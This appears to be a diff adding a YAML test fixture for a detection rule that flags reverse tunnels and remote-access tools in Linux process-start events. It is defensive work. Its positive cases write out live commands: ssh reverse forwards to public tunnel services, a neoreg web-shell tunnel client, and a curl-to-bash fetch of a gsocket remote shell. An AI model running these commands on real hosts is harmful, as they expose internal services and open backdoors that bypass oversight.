@@ -1,0 +1,63 @@
+docs:
+- id: pos1
+  match: true
+  doc:
+    host:
+      os: {type: linux}
+      name: srv1
+    event: {category: process, type: start}
+    user: {name: alice}
+    process: {name: cloudflared, command_line: 'cloudflared tunnel --url http://localhost:8080'}
+- id: pos2
+  match: true
+  doc:
+    host:
+      os: {type: linux}
+      name: srv1
+    event: {category: process, type: start}
+    user: {name: alice}
+    process: {name: ssh, command_line: 'ssh -R 80:localhost:8080 serveo.net'}
+- id: pos3
+  match: true
+  doc:
+    host:
+      os: {type: linux}
+      name: srv1
+    event: {category: process, type: start}
+    user: {name: alice}
+    process: {name: ssh, command_line: 'ssh -p 443 -R0:localhost:8080 a.pinggy.io'}
+- id: pos4
+  match: true
+  doc:
+    host:
+      os: {type: linux}
+      name: srv1
+    event: {category: process, type: start}
+    user: {name: alice}
+    process: {name: npx, command_line: 'npx localtunnel --port 8080'}
+- id: pos5
+  match: true
+  doc:
+    host:
+      os: {type: linux}
+      name: srv1
+    event: {category: process, type: start}
+    user: {name: alice}
+    process: {name: python3, command_line: 'python3 neoreg.py -k pass -u http://203.0.113.9/tunnel.php'}
+- id: pos6
+  match: true
+  doc:
+    host:
+      os: {type: linux}
+      name: srv1
+    event: {category: process, type: start}
+    user: {name: alice}
+    process: {name: bash, command_line: 'bash -c "$(curl -fsSL https://gsocket.io/y)"'}
+- id: neg1
+  doc:
+    host:
+      os: {type: linux}
+      name: srv1
+    event: {category: process, type: start}
+    user: {name: alice}
+    process: {name: ssh, command_line: 'ssh -R 8080:localhost:80 admin@bastion.example.org'}
